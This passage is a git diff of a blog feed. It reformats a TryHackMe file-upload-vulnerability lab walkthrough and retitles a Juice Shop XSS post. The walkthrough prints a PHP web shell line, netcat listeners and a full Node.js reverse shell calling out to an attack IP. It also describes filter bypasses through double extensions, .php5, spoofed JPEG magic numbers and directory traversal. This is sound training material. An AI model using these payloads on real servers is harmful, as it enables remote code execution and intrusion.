+	echo system($_GET[&#34;cmd&#34;]);
+?&gt;
+</code></pre><p>From this point, system files can be read and/or attempts to upgrade the webshell to a remote shell.</p>
 <h4 id="remote-shell">Remote Shell</h4>
 <p>After editing and uploading the necessary reverse shell script, such as <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">Pentest Monkey&rsquo;s 2007 PHP tool</a>, the attacking machine can invoke a <code>netcat</code> listener via the venerable</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#1c01ce">4444</span>
-</span></span></code></pre></div><p>The shell script will be activated by navigating to the uploaded shell&rsquo;s location on the server with a browser. This will give the attacker RCE capabillities on the target server, though ideally the reverse shell would then be stabilized with user privileges escalated.</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+</code></pre><p>The shell script will be activated by navigating to the uploaded shell&rsquo;s location on the server with a browser. This will give the attacker RCE capabillities on the target server, though ideally the reverse shell would then be stabilized with user privileges escalated.</p>
 <h4 id="question-51">Question 5.1</h4>
 <h5 id="run-a-gobuster-scan-on-the-website-using-the-syntax-from-the-screenshot-above-what-directory-looks-like-it-might-be-used-for-uploads">Run a Gobuster scan on the website using the syntax from the screenshot above. What directory looks like it might be used for uploads?</h5>
 <p>Running:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -u shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
-</span></span></code></pre></div><p>creates the following output:</p>
+<pre tabindex="0"><code>gobuster dir -u shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+</code></pre><p>creates the following output:</p>
 <p><img src="/images/uv/uv-gobuster.png" alt="UV - Gobuster"></p>
 <h4 id="question-52">Question 5.2</h4>
 <h5 id="get-either-a-web-shell-or-a-reverse-shell-on-the-machine-whats-the-flag-in-the-varwww-directory-of-the-server">Get either a web shell or a reverse shell on the machine. What&rsquo;s the flag in the /var/www/ directory of the server?</h5>
@@ -1491,8 +1493,8 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <p>The next example uses the same premise, but this time involving a server with an unknown filtering mechanism. This is known as doing it &ldquo;<em>black-box</em>.&rdquo;<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.</p>
 <p>We begin by verifying that a standard <code>.jpeg</code> file can be uploaded; and that a <code>shell.php</code> script can not. After experimenting with files to better understand what the server will and will not accept, we reach the conclusion that there are no shell extensions that will pass through the filter and also execute on the server.</p>
 <p>We then remember that the filtering mechanism in the previous example used <code>pathinfo()</code> to get the file&rsquo;s extension by parsing the characters after the final <code>.</code> in the filename.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#000">$extension</span> <span style="color:#000">=</span> <span style="color:#000">pathinfo</span>(<span style="color:#000">$_FILES</span>[<span style="color:#c41a16">&#34;fileToUpload&#34;</span>][<span style="color:#c41a16">&#34;name&#34;</span>])[<span style="color:#c41a16">&#34;extension&#34;</span>];
-</span></span></code></pre></div><p>We then bypass the server&rsquo;s filter code by changing our payload&rsquo;s filename from <code>ptm-shell.php</code> to <code>ptm-shell.jpeg.php</code>, as the <code>PHP</code> script parses the file&rsquo;s extension as the characters that follow the final <code>.</code>.</p>
+<pre tabindex="0"><code>$extension = pathinfo($_FILES[&#34;fileToUpload&#34;][&#34;name&#34;])[&#34;extension&#34;];
+</code></pre><p>We then bypass the server&rsquo;s filter code by changing our payload&rsquo;s filename from <code>ptm-shell.php</code> to <code>ptm-shell.jpeg.php</code>, as the <code>PHP</code> script parses the file&rsquo;s extension as the characters that follow the final <code>.</code>.</p>
 <p>Before offering our task question, the text asks us to consider that these examples are among many possibilities for exploiting upload vulnerabilities.</p>
 <blockquote>
 <p>As with everything in hacking, we are looking to exploit flaws in code that others have written; this code may very well be uniquely written for the task at hand. This is the really important point to take away from this task: there are a million different ways to implement the same feature when it comes to programming &ndash; your exploitation must be tailored to the filter at hand. The key to bypassing any kind of server side filter is to enumerate and see what is allowed, as well as what is blocked; then try to craft a payload which can pass the criteria the filter is looking for.</p>
@@ -1504,11 +1506,11 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <p><img src="/images/uv/anx-home.png" alt="anx-home"></p>
 <p>First, we will upload a standard file to the server. Successsfully doing so will simultaneously give us a file to look for in the server&rsquo;s upload destination directory and also start informing us of which file formats pass through the filter. I will use the same <code>coffee.png</code> clip art file from the previous task for this purpose.</p>
 <p>We then begin our investigation by running a <code>gobuster</code> scan of <code>annex.uploadvulns.thm</code>:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -u annex.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o gb-annex
-</span></span></code></pre></div><p>The scan enumerates the following directories:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>1. /privacy <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 332<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://annex.uploadvulns.thm/privacy/<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>2. /assets <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 331<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://annex.uploadvulns.thm/assets/<span style="color:#000">]</span>
-</span></span></code></pre></div><p>While the <code>/assets</code> directory does not contain our uploaded image file, <code>/privacy</code> does. We note here that the filename has been modified to include date and time information before the existing name:</p>
+<pre tabindex="0"><code>gobuster dir -u annex.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o gb-annex
+</code></pre><p>The scan enumerates the following directories:</p>
+<pre tabindex="0"><code>1. /privacy (Status: 301) [Size: 332] [--&gt; http://annex.uploadvulns.thm/privacy/]
+2. /assets (Status: 301) [Size: 331] [--&gt; http://annex.uploadvulns.thm/assets/]
+</code></pre><p>While the <code>/assets</code> directory does not contain our uploaded image file, <code>/privacy</code> does. We note here that the filename has been modified to include date and time information before the existing name:</p>
 <p><img src="/images/uv/anx-assets.png" alt="anx-assets"></p>
 <p>From here, we try to upload our reverse shell script directly, but are given this error message, as our payload was filtered by the server.</p>
 <p><img src="/images/uv/anx-invalid.png" alt="anx-invalid"></p>
@@ -1517,8 +1519,8 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <p>While we receive <code>File type is invalid</code> responses for 8 of the 9 files listed above, <code>ptm-shell.php5</code> makes it through the server&rsquo;s filter and into the <code>/privacy</code> directory.</p>
 <p><img src="/images/uv/anx-php5.png" alt="anx-php5"></p>
 <p>From here we simply invoke our <code>netcat</code> listener on our attack machine with:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#1c01ce">4444</span>
-</span></span></code></pre></div><p>and then run the script by visiting the file&rsquo;s location in our browser.</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+</code></pre><p>and then run the script by visiting the file&rsquo;s location in our browser.</p>
 <p><img src="/images/uv/anx-solution.png" alt="anx-solution"></p>
 <h2 id="task-9---bypassing-server-side-filtering-magic-numbers">Task 9 - Bypassing Server-Side Filtering: Magic Numbers</h2>
 <p>This task builds on the previous one, highlighting the use of &ldquo;magic number checking&rdquo; as an approach to server-side filtering.</p>
@@ -1527,8 +1529,8 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <p>This task&rsquo;s walkthrough begins again with a webpage housing a file upload form. As is expected, <code>.php</code> files are caught in the server&rsquo;s filter, while <code>.jpeg</code> images are not.</p>
 <p>As we know that <code>.jpeg</code> files are permitted by the filter, we should be able to add the &ldquo;magic numbers&rdquo; <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">that correspond to this file type</a> to the top of our <code>.php</code> script. To do so, we first add 4 conventional characters (it does not matter which) to the top of our <code>ptm-shell.php</code> script.</p>
 <p>Next, we open the file in <code>hexeditor</code> (or an equivalent application) and change the conventional characters to <code>FF D8 FF DB</code> - the magic numbers for <code>.jpeg</code> format files. To check that this has been done properly, run:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>file ptm-shell.php
-</span></span></code></pre></div><p>This should return <code>ptm-shell.php: JPEG image data</code>.</p>
+<pre tabindex="0"><code>file ptm-shell.php
+</code></pre><p>This should return <code>ptm-shell.php: JPEG image data</code>.</p>
 <p>We are then able to upload our <code>.php</code> reverse shell script, now disguised as a <code>.jpeg</code> image, to the server and execute it.</p>
 <p>Before being given the challenge associated with this task, we are warned that directory indexing has been disabled on the target server.</p>
 <h4 id="question-91">Question 9.1</h4>
@@ -1604,25 +1606,25 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <p><img src="/images/uv/jewel-wap.png" alt="jewel-wap"></p>
 <p>From this, we learn that this site is running <a href="https://expressjs.com/">Express</a>, a <code>Node.js</code> web application framework. This means that our <code>ptm-shell.php</code> reverse shell script will almost certainly not work, as the server is configured to run <code>JavaScript</code> code.</p>
 <p>Luckily for us, the PayloadsAllTheThings <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs">Reverse Shell Cheat Sheet repository</a> on GitHub includes a reverse shell script for use with <code>Node.js</code>. Here it is:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>(<span style="color:#a90d91">function</span>(){
-</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">var</span> <span style="color:#000">net</span> <span style="color:#000">=</span> <span style="color:#000">require</span>(<span style="color:#c41a16">&#34;net&#34;</span>),
-</span></span><span style="display:flex;"><span>        <span style="color:#000">cp</span> <span style="color:#000">=</span> <span style="color:#000">require</span>(<span style="color:#c41a16">&#34;child_process&#34;</span>),
-</span></span><span style="display:flex;"><span>        <span style="color:#000">sh</span> <span style="color:#000">=</span> <span style="color:#000">cp</span>.<span style="color:#000">spawn</span>(<span style="color:#c41a16">&#34;/bin/sh&#34;</span>, []);
-</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">var</span> <span style="color:#000">client</span> <span style="color:#000">=</span> <span style="color:#a90d91">new</span> <span style="color:#000">net</span>.<span style="color:#000">Socket</span>();
-</span></span><span style="display:flex;"><span>    <span style="color:#000">client</span>.<span style="color:#000">connect</span>(<span style="color:#1c01ce">4242</span>, <span style="color:#c41a16">&#34;10.0.0.1&#34;</span>, <span style="color:#a90d91">function</span>(){
-</span></span><span style="display:flex;"><span>        <span style="color:#000">client</span>.<span style="color:#000">pipe</span>(<span style="color:#000">sh</span>.<span style="color:#000">stdin</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#000">sh</span>.<span style="color:#000">stdout</span>.<span style="color:#000">pipe</span>(<span style="color:#000">client</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#000">sh</span>.<span style="color:#000">stderr</span>.<span style="color:#000">pipe</span>(<span style="color:#000">client</span>);
-</span></span><span style="display:flex;"><span>    });
-</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">return</span> <span style="color:#c41a16">/a/</span>; <span style="color:#177500">// Prevents the Node.js application from crashing
-</span></span></span><span style="display:flex;"><span><span style="color:#177500"></span>})();
-</span></span></code></pre></div><p>After configuring the port and IP address above to match those of our attack machine, we can save this as <code>njs-shell.js</code> to use a bit later.</p>
+<pre tabindex="0"><code>(function(){
+    var net = require(&#34;net&#34;),
+        cp = require(&#34;child_process&#34;),
+        sh = cp.spawn(&#34;/bin/sh&#34;, []);
+    var client = new net.Socket();
+    client.connect(4242, &#34;10.0.0.1&#34;, function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+</code></pre><p>After configuring the port and IP address above to match those of our attack machine, we can save this as <code>njs-shell.js</code> to use a bit later.</p>
 <h3 id="identifying-vulnerabilities">Identifying vulnerabilities</h3>
 <p>For more information, we can inspect the source code of the page, which includes a <code>.js</code> script called <code>/upload.js</code> that uses the following filtering scheme:</p>
 <p><img src="/images/uv/jewel-uploadjs.png" alt="jewel-uploadjs"></p>
 <p>Also, note this line in the source code of the home page:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#000">input</span> <span style="color:#836c28">id</span><span style="color:#000">=</span><span style="color:#c41a16">&#34;fileSelect&#34;</span> <span style="color:#836c28">type</span><span style="color:#000">=</span><span style="color:#c41a16">&#34;file&#34;</span> <span style="color:#836c28">name</span><span style="color:#000">=</span><span style="color:#c41a16">&#34;fileToUpload&#34;</span> <span style="color:#836c28">accept</span><span style="color:#000">=</span><span style="color:#c41a16">&#34;image/jpeg&#34;</span>&gt;
-</span></span></code></pre></div><p>We can deduce, from the above code, that the server:</p>
+<pre tabindex="0"><code>&lt;input id=&#34;fileSelect&#34; type=&#34;file&#34; name=&#34;fileToUpload&#34; accept=&#34;image/jpeg&#34;&gt;
+</code></pre><p>We can deduce, from the above code, that the server:</p>
 <ul>
 <li>Has a size/length limit in place</li>
 <li>Filters files that do not contain <code>ÿØÿ</code> as the first three &ldquo;magic number values&rdquo;
@@ -1661,8 +1663,8 @@ we need to figure out how to get our <code>njs-shell.js</code> reverse shell pas
 <p>In order to confirm our success, we can run another <code>gobuster</code> scan, which confirms the existence of <code>LED.jpg</code> in the <code>/content</code> directory.</p>
 <p><img src="/images/uv/jewel-jsjpg-upload.png" alt="jewel-jsjpg-upload"></p>
 <p>To activate our reverse shell and achieve RCE, we&rsquo;ll need to remember to enable our <code>netcat</code> listener with:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#1c01ce">4444</span>
-</span></span></code></pre></div><p>Now we can navigate to the secret admin page that we identified at <code>http://jewel.uploadvulns.thm/admin</code> and determine how to activate our reverse shell via <code>http://jewel.uploadvulns.thm/content/LED.jpg</code>. The placeholder text of the form field tells us that we can input the location of files to execute from the <code>/modules</code> directory. From our previous More Enumeration efforts, we know that the <code>/content</code> directory sits adjacent to <code>/modules</code> under the root level of the server&rsquo;s filesystem. Thus, unless actively prohibited, we can use <code>../</code> to traverse directories. This means that by entering <code>../content/LED.jpg</code>, we should be able to activate our reverse shell script.</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+</code></pre><p>Now we can navigate to the secret admin page that we identified at <code>http://jewel.uploadvulns.thm/admin</code> and determine how to activate our reverse shell via <code>http://jewel.uploadvulns.thm/content/LED.jpg</code>. The placeholder text of the form field tells us that we can input the location of files to execute from the <code>/modules</code> directory. From our previous More Enumeration efforts, we know that the <code>/content</code> directory sits adjacent to <code>/modules</code> under the root level of the server&rsquo;s filesystem. Thus, unless actively prohibited, we can use <code>../</code> to traverse directories. This means that by entering <code>../content/LED.jpg</code>, we should be able to activate our reverse shell script.</p>
 <p><img src="/images/uv/jewel-led-rce.png" alt="jewel-led-rce"></p>
 <p><em>et voilà!</em></p>
 <p>Thanks to <a href="https://tryhackme.com/p/MuirlandOracle">MuirlandOracle</a> for the informative room!</p>
@@ -1678,15 +1680,14 @@ we need to figure out how to get our <code>njs-shell.js</code> reverse shell pas
         </item>
         
         <item>
-            <title>Finishing the OWASP Juice Shop</title>
-            <link>https://robscharf.github.io/posts/2022/04/finishing-the-owasp-juice-shop/</link>
+            <title>Finishing the OWASP Juice Shop XSS</title>
+            <link>https://robscharf.github.io/posts/2022/04/finishing-the-owasp-juice-shop-xss/</link>
             <pubDate>Mon, 25 Apr 2022 14:20:00 +0000</pubDate>
             
-            <guid>https://robscharf.github.io/posts/2022/04/finishing-the-owasp-juice-shop/</guid>
-            <description>Wrapping up my intro to the Juice Shop Today I finished up the OWASP Juice Shop Room on THM, after leaving the final Cross-site Scripting (XSS) modules unfinished last week. This involved quick introductory examples of three XSS modalities:
+            <guid>https://robscharf.github.io/posts/2022/04/finishing-the-owasp-juice-shop-xss/</guid>
+            <description>Today I finished up the OWASP Juice Shop Room on THM, after leaving the final Cross-site Scripting (XSS) modules unfinished last week. This involved quick introductory examples of three XSS modalities:
 DOM Persistent (Server-side) Reflected (Client-side) DOM XSS uses the HTML environment to execute malicious JavaScript. This type of attack commonly uses the &amp;lt;script&amp;gt; HTML tag. Persistent XSS is JavaScript that is run when the server loads the page containing it.</description>
-            <content type="html"><![CDATA[<h3 id="wrapping-up-my-intro-to-the-juice-shop">Wrapping up my intro to the Juice Shop</h3>
-<p>Today I finished up the <a href="https://tryhackme.com/room/owaspjuiceshop">OWASP Juice Shop Room</a> on THM, after leaving the final Cross-site Scripting (XSS) modules unfinished last week. This involved quick introductory examples of three XSS modalities:</p>
+            <content type="html"><![CDATA[<p>Today I finished up the <a href="https://tryhackme.com/room/owaspjuiceshop">OWASP Juice Shop Room</a> on THM, after leaving the final Cross-site Scripting (XSS) modules unfinished last week. This involved quick introductory examples of three XSS modalities:</p>
 <table>
 <thead>
 <tr>
